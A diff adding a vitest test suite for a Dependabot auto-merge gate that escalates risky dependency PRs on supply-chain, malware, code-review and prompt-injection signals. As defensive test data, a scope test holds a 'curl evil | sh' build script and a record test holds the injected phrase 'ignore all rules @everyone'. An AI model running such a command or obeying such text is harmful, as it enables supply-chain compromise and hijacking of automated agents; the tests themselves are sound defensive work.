@@ -1,0 +1,481 @@
+import { describe, it, expect } from 'vitest';
+import {
+  REQUIRED_CHECKS,
+  advisoryKeys,
+  assessmentKey,
+  classifyBump,
+  classifyMain,
+  decide,
+  diffLockfiles,
+  evaluateRules,
+  latestCheckRuns,
+  manifestChangeIsScoped,
+  parseUpdatedDependencies,
+  updatesKey,
+} from '../../.github/deps-agent/gate.mjs';
+import {
+  MARKER,
+  decodeRecord,
+  neutralize,
+  pushHistory,
+  renderEscalation,
+  renderRecord,
+} from '../../.github/deps-agent/record.mjs';
+
+const NOW = new Date('2026-10-23T12:00:00Z');
+
+/** Facts for a clean, mergeable patch bump; each test overrides one dimension. */
+type Facts = Parameters<typeof evaluateRules>[0];
+
+function cleanFacts(overrides: Record<string, unknown> = {}): Facts {
+  return {
+    author: 'dependabot[bot]',
+    branch: 'dependabot/npm_and_yarn/zod-4.6.7',
+    files: ['package.json', 'package-lock.json'],
+    updates: [{ name: 'zod', type: 'direct:production', from: '4.4.3', to: '4.6.7' }],
+    manifestScoped: true,
+    checks: REQUIRED_CHECKS.map((name) => ({ name, status: 'completed', conclusion: 'success' })),
+    lock: { added: [], newInstallScripts: [] },
+    registry: [
+      {
+        name: 'zod',
+        publishedAt: '2026-10-01T00:00:00Z',
+        prevAttested: true,
+        attested: true,
+        prevPublisher: 'colinhacks',
+        publisher: 'colinhacks',
+      },
+    ],
+    newAdvisories: [],
+    malware: [],
+    mergeable: true,
+    fresh: true,
+    main: 'healthy',
+    assessment: { verdict: 'merge', codeReview: { coverage: 'full', suspicious: [] } },
+    now: NOW,
+    ...overrides,
+  } as Facts;
+}
+
+const statusOf = (facts: Facts, id: string) =>
+  evaluateRules(facts).find((r) => r.id === id)?.status;
+
+const outcome = (
+  facts: Facts,
+  opts: Partial<{ mode: string; override: boolean; held: boolean; slotFree: boolean }> = {},
+) =>
+  decide({
+    rules: evaluateRules(facts),
+    mode: 'merge',
+    override: false,
+    held: false,
+    slotFree: true,
+    ...opts,
+  } as Parameters<typeof decide>[0]);
+
+describe('classifyBump', () => {
+  it('classifies ordinary patch, minor and major bumps', () => {
+    expect(classifyBump('16.3.8', '16.3.9')).toBe('patch');
+    expect(classifyBump('16.3.8', '16.4.2')).toBe('minor');
+    expect(classifyBump('9.39.5', '10.13.0')).toBe('major');
+  });
+
+  it('treats a 0.x minor bump as major', () => {
+    expect(classifyBump('0.115.0', '0.135.0')).toBe('major');
+  });
+
+  it('treats a 0.x patch bump as patch but any 0.0.x change as major', () => {
+    expect(classifyBump('0.45.2', '0.45.4')).toBe('patch');
+    expect(classifyBump('0.0.3', '0.0.4')).toBe('major');
+  });
+
+  it('treats prereleases and unparseable versions as major', () => {
+    expect(classifyBump('1.2.3', '1.2.4-beta.1')).toBe('major');
+    expect(classifyBump('1.2.3', 'latest')).toBe('major');
+  });
+});
+
+describe('parseUpdatedDependencies', () => {
+  it('reads every entry of a grouped Dependabot commit message', () => {
+    const msg = [
+      'chore(deps-dev): bump the dev-dependencies group with 2 updates',
+      '',
+      '---',
+      'updated-dependencies:',
+      '- dependency-name: pino-pretty',
+      '  dependency-version: 13.2.0',
+      '  dependency-type: direct:development',
+      '  update-type: version-update:semver-minor',
+      '- dependency-name: "@testing-library/dom"',
+      '  dependency-version: 10.4.2',
+      '  dependency-type: direct:development',
+      '...',
+    ].join('\n');
+    expect(parseUpdatedDependencies(msg)).toEqual([
+      { name: 'pino-pretty', type: 'direct:development', version: '13.2.0' },
+      { name: '@testing-library/dom', type: 'direct:development', version: '10.4.2' },
+    ]);
+  });
+
+  it('returns nothing for a hand-written commit', () => {
+    expect(parseUpdatedDependencies('fix: something')).toEqual([]);
+  });
+});
+
+describe('diffLockfiles', () => {
+  it('reports added packages and newly introduced install scripts', () => {
+    const base = {
+      packages: { '': {}, 'node_modules/a': { version: '1.0.0' } },
+    };
+    const head = {
+      packages: {
+        '': {},
+        'node_modules/a': { version: '1.0.1', hasInstallScript: true },
+        'node_modules/b': { version: '2.0.0' },
+      },
+    };
+    expect(diffLockfiles(base, head)).toEqual({
+      added: ['node_modules/b'],
+      newInstallScripts: ['node_modules/a'],
+      changed: ['a@1.0.1', 'b@2.0.0'],
+    });
+  });
+
+  it('does not flag an install script that already existed on main', () => {
+    const entry = { version: '1.0.0', hasInstallScript: true };
+    const lock = { packages: { 'node_modules/esbuild': entry } };
+    expect(diffLockfiles(lock, lock).newInstallScripts).toEqual([]);
+  });
+});
+
+describe('assessment cache key', () => {
+  const green = REQUIRED_CHECKS.map((name) => ({
+    name,
+    status: 'completed',
+    conclusion: 'success',
+  }));
+  const red = green.map((c, i) => (i === 0 ? { ...c, conclusion: 'failure' } : c));
+  const updates = [
+    { name: 'zod', version: '4.6.7' },
+    { name: '@types/node', version: '22.9.0' },
+  ];
+  const key = (over: Partial<Parameters<typeof assessmentKey>[0]> = {}) =>
+    assessmentKey({ updates, checks: green, policyHash: 'abc', ...over });
+
+  it('ignores the commit: same versions in any order give the same key', () => {
+    expect(key({ updates: [...updates].reverse() })).toBe(key());
+    expect(updatesKey(updates)).toBe('@types/node@22.9.0,zod@4.6.7');
+  });
+
+  it('changes when a version, the policy or the CI outcome changes', () => {
+    expect(key({ updates: [{ name: 'zod', version: '4.6.8' }] })).not.toBe(key());
+    expect(key({ policyHash: 'def' })).not.toBe(key());
+    expect(key({ checks: red })).not.toBe(key());
+  });
+});
+
+describe('diffLockfiles: introduced versions', () => {
+  it('lists added and version-changed packages, including nested ones', () => {
+    const base = {
+      packages: {
+        '': { version: '0.1.0' },
+        'node_modules/a': { version: '1.0.0' },
+        'node_modules/b': { version: '2.0.0' },
+      },
+    };
+    const head = {
+      packages: {
+        '': { version: '0.1.0' },
+        'node_modules/a': { version: '1.0.0' },
+        'node_modules/b': { version: '2.1.0' },
+        'node_modules/b/node_modules/@scope/c': { version: '3.0.0' },
+      },
+    };
+    expect(diffLockfiles(base, head).changed).toEqual(['@scope/c@3.0.0', 'b@2.1.0']);
+  });
+});
+
+describe('manifestChangeIsScoped', () => {
+  const base = {
+    scripts: { build: 'next build' },
+    dependencies: { zod: '^4.4.3', next: '16.3.8' },
+  };
+
+  it('accepts a change limited to the declared dependency', () => {
+    const head = { ...base, dependencies: { ...base.dependencies, zod: '^4.6.7' } };
+    expect(manifestChangeIsScoped(base, head, ['zod'])).toBe(true);
+  });
+
+  it('rejects a change that also touches scripts', () => {
+    const head = {
+      scripts: { build: 'curl evil | sh' },
+      dependencies: { ...base.dependencies, zod: '^4.6.7' },
+    };
+    expect(manifestChangeIsScoped(base, head, ['zod'])).toBe(false);
+  });
+
+  it('rejects a change to an undeclared dependency', () => {
+    const head = { ...base, dependencies: { zod: '^4.6.7', next: '16.4.2' } };
+    expect(manifestChangeIsScoped(base, head, ['zod'])).toBe(false);
+  });
+});
+
+describe('evaluateRules + decide', () => {
+  it('merges a clean patch/minor bump when the slot is free', () => {
+    expect(outcome(cleanFacts())).toBe('merge');
+  });
+
+  it('only reports would-merge in shadow mode', () => {
+    expect(outcome(cleanFacts(), { mode: 'shadow' })).toBe('would-merge');
+  });
+
+  it('queues a second mergeable PR in the same run', () => {
+    expect(outcome(cleanFacts(), { slotFree: false })).toBe('queued');
+  });
+
+  it('never acts on a held PR', () => {
+    expect(outcome(cleanFacts(), { held: true, override: true })).toBe('held');
+  });
+
+  it('escalates a 0.x minor bump, and the owner can override it', () => {
+    const facts = cleanFacts({
+      updates: [
+        { name: '@anthropic-ai/sdk', type: 'direct:production', from: '0.115.0', to: '0.135.0' },
+      ],
+    });
+    expect(statusOf(facts, 'semver')).toBe('fail');
+    expect(outcome(facts)).toBe('escalate');
+    expect(outcome(facts, { override: true })).toBe('merge');
+  });
+
+  it('escalates a PR not authored by Dependabot even with an owner override', () => {
+    const facts = cleanFacts({ author: 'mallory' });
+    expect(outcome(facts, { override: true })).toBe('escalate');
+  });
+
+  it('escalates files outside package.json/lockfile even with an override', () => {
+    const facts = cleanFacts({ files: ['package.json', 'package-lock.json', 'src/proxy.ts'] });
+    expect(statusOf(facts, 'files')).toBe('fail');
+    expect(outcome(facts, { override: true })).toBe('escalate');
+  });
+
+  it('escalates the github-actions ecosystem', () => {
+    const facts = cleanFacts({ branch: 'dependabot/github_actions/actions/checkout-7' });
+    expect(outcome(facts)).toBe('escalate');
+  });
+
+  it('escalates a failed check even with an override', () => {
+    const checks = REQUIRED_CHECKS.map((name) => ({
+      name,
+      status: 'completed',
+      conclusion: name === 'Type-check' ? 'failure' : 'success',
+    }));
+    expect(outcome(cleanFacts({ checks }), { override: true })).toBe('escalate');
+  });
+
+  it('waits while a required check is still running or missing', () => {
+    const checks = REQUIRED_CHECKS.slice(1).map((name) => ({
+      name,
+      status: 'in_progress',
+      conclusion: null,
+    }));
+    const facts = cleanFacts({ checks });
+    expect(statusOf(facts, 'checks')).toBe('pending');
+    expect(outcome(facts)).toBe('wait');
+  });
+
+  it('escalates supply-chain signals: install scripts, provenance, publisher, advisories', () => {
+    const reg = cleanFacts().registry[0];
+    const cases = [
+      cleanFacts({ lock: { added: [], newInstallScripts: ['node_modules/x'] } }),
+      cleanFacts({ registry: [{ ...reg, attested: false }] }),
+      cleanFacts({ registry: [{ ...reg, publisher: 'someone-else' }] }),
+      cleanFacts({ newAdvisories: ['GHSA-xxxx'] }),
+      cleanFacts({
+        lock: { added: Array.from({ length: 16 }, (_, i) => `p${i}`), newInstallScripts: [] },
+      }),
+    ];
+    for (const facts of cases) expect(outcome(facts)).toBe('escalate');
+  });
+
+  it('escalates a release younger than the cooldown or with unknown publish time', () => {
+    const reg = cleanFacts().registry[0];
+    expect(
+      outcome(cleanFacts({ registry: [{ ...reg, publishedAt: '2026-10-22T00:00:00Z' }] })),
+    ).toBe('escalate');
+    expect(outcome(cleanFacts({ registry: [{ ...reg, publishedAt: null }] }))).toBe('escalate');
+  });
+
+  it('escalates suspected prompt injection even with an owner override', () => {
+    const facts = cleanFacts({ assessment: { verdict: 'merge', injectionSuspected: true } });
+    expect(statusOf(facts, 'injection')).toBe('fail');
+    expect(outcome(facts, { override: true })).toBe('escalate');
+  });
+
+  it('escalates when CI finished but a required check never ran (renamed job)', () => {
+    const checks = REQUIRED_CHECKS.slice(1).map((name) => ({
+      name,
+      status: 'completed',
+      conclusion: 'success',
+    }));
+    expect(outcome(cleanFacts({ checks }))).toBe('escalate');
+  });
+
+  it('escalates a malware advisory even with an owner override', () => {
+    const facts = cleanFacts({ malware: ['GHSA-8mgj-vmr8-frr6 (debug@4.4.2)'] });
+    expect(statusOf(facts, 'malware')).toBe('fail');
+    expect(outcome(facts, { override: true })).toBe('escalate');
+  });
+
+  it('waits when the malware feed is unavailable, even with an override', () => {
+    const facts = cleanFacts({ malware: null });
+    expect(statusOf(facts, 'malware')).toBe('pending');
+    expect(outcome(facts, { override: true })).toBe('wait');
+  });
+
+  it('escalates suspicious code found in the package diff; the owner can override', () => {
+    const facts = cleanFacts({
+      assessment: {
+        verdict: 'merge',
+        codeReview: {
+          coverage: 'partial',
+          suspicious: [{ file: 'dist/index.js', finding: 'new fetch to an unknown host' }],
+        },
+      },
+    });
+    expect(statusOf(facts, 'codeReview')).toBe('fail');
+    expect(outcome(facts)).toBe('escalate');
+    expect(outcome(facts, { override: true })).toBe('merge');
+  });
+
+  it('escalates an assessment that skipped the code review', () => {
+    expect(outcome(cleanFacts({ assessment: { verdict: 'merge' } }))).toBe('escalate');
+  });
+
+  it('escalates a release published 6 days ago (7-day cooldown)', () => {
+    const reg = cleanFacts().registry[0];
+    const facts = cleanFacts({ registry: [{ ...reg, publishedAt: '2026-10-17T12:00:00Z' }] });
+    expect(statusOf(facts, 'cooldown')).toBe('fail');
+  });
+
+  it('escalates when the assessment says escalate, and waits when it is missing', () => {
+    expect(outcome(cleanFacts({ assessment: { verdict: 'escalate' } }))).toBe('escalate');
+    expect(outcome(cleanFacts({ assessment: null }))).toBe('wait');
+  });
+
+  it('lets an owner override stand in for a missing assessment', () => {
+    expect(outcome(cleanFacts({ assessment: null }), { override: true })).toBe('merge');
+  });
+
+  it('waits (does not escalate) on conflicts, stale lockfile or unhealthy main', () => {
+    for (const facts of [
+      cleanFacts({ mergeable: false }),
+      cleanFacts({ mergeable: null }),
+      cleanFacts({ fresh: false }),
+      cleanFacts({ main: 'broken' }),
+      cleanFacts({ main: 'pending' }),
+    ]) {
+      expect(outcome(facts)).toBe('wait');
+      expect(outcome(facts, { override: true })).toBe('wait');
+    }
+  });
+});
+
+describe('latestCheckRuns', () => {
+  it('keeps the most recent run of a re-run check', () => {
+    const runs = [
+      { id: 2, name: 'Lint', status: 'completed', conclusion: 'success' },
+      { id: 1, name: 'Lint', status: 'completed', conclusion: 'failure' },
+    ];
+    expect(latestCheckRuns(runs)).toEqual([
+      { name: 'Lint', status: 'completed', conclusion: 'success' },
+    ]);
+  });
+});
+
+describe('classifyMain', () => {
+  const ci = { status: 'completed', conclusion: 'success', updated_at: '2026-10-23T11:50:00Z' };
+  const deployed = { status: 'completed', conclusion: 'success' };
+
+  it('is healthy only once CI and Deploy both succeeded (or Deploy was skipped)', () => {
+    expect(classifyMain(ci, deployed, NOW).state).toBe('healthy');
+    expect(classifyMain(ci, { ...deployed, conclusion: 'skipped' }, NOW).state).toBe('healthy');
+  });
+
+  it('is pending while CI or Deploy runs, broken when either fails', () => {
+    expect(classifyMain(null, null, NOW).state).toBe('pending');
+    expect(classifyMain({ ...ci, status: 'in_progress' }, null, NOW).state).toBe('pending');
+    expect(classifyMain(ci, { status: 'in_progress', conclusion: null }, NOW).state).toBe(
+      'pending',
+    );
+    expect(classifyMain({ ...ci, conclusion: 'failure' }, null, NOW).state).toBe('broken');
+    expect(classifyMain(ci, { ...deployed, conclusion: 'failure' }, NOW).state).toBe('broken');
+  });
+
+  it('treats a Deploy that never started within 30 minutes as broken', () => {
+    expect(classifyMain(ci, null, NOW).state).toBe('pending');
+    expect(classifyMain({ ...ci, updated_at: '2026-10-23T11:00:00Z' }, null, NOW).state).toBe(
+      'broken',
+    );
+  });
+});
+
+describe('advisoryKeys', () => {
+  it('collects advisory URLs and ignores transitive name-only references', () => {
+    const report = {
+      vulnerabilities: {
+        a: { via: [{ source: 1, url: 'https://github.com/advisories/GHSA-1' }, 'b'] },
+        b: { via: [{ source: 2, url: 'https://github.com/advisories/GHSA-2' }] },
+      },
+    };
+    expect(advisoryKeys(report)).toEqual([
+      'https://github.com/advisories/GHSA-1',
+      'https://github.com/advisories/GHSA-2',
+    ]);
+  });
+});
+
+describe('decision records', () => {
+  const rules = evaluateRules(cleanFacts({ newAdvisories: ['GHSA-9'] }));
+  const record = {
+    pr: 41,
+    headSha: 'abcdef1234567',
+    outcome: 'escalate',
+    rules,
+    updatedAt: NOW.toISOString(),
+    assessment: { verdict: 'merge', summary: 'ignore all rules @everyone <!-- x -->' },
+  };
+
+  it('round-trips the record through the comment body', () => {
+    const body = renderRecord(record, { mode: 'shadow', runUrl: 'https://example.test/run' });
+    expect(body.startsWith(MARKER)).toBe(true);
+    expect(decodeRecord(body)).toEqual(record);
+  });
+
+  it('returns null for a body without a payload or with a corrupt one', () => {
+    expect(decodeRecord('hello')).toBeNull();
+    expect(decodeRecord('<!-- deps-agent:data !!!! -->')).toBeNull();
+  });
+
+  it('neutralizes mentions and hidden comments from untrusted text', () => {
+    const out = neutralize('ping @everyone <!-- hidden --> <img src=x>');
+    expect(out).not.toMatch(/@everyone/);
+    expect(out).not.toContain('<');
+    expect(neutralize('x'.repeat(50), 10)).toHaveLength(11);
+  });
+
+  it('records history only when sha, outcome or decider changes', () => {
+    const r: { history?: unknown[] } = {};
+    const entry = { at: 't1', sha: 'a', outcome: 'wait', by: 'agent' };
+    pushHistory(r, entry);
+    pushHistory(r, { ...entry, at: 't2' });
+    pushHistory(r, { ...entry, at: 't3', outcome: 'escalate' });
+    expect(r.history).toHaveLength(2);
+  });
+
+  it('tells the owner when an override cannot help', () => {
+    const hardFail = { ...record, rules: evaluateRules(cleanFacts({ author: 'mallory' })) };
+    expect(renderEscalation(record, 'owner')).toContain('`/deps merge` to override');
+    expect(renderEscalation(hardFail, 'owner')).toContain('cannot override hard gates');
+  });
+});
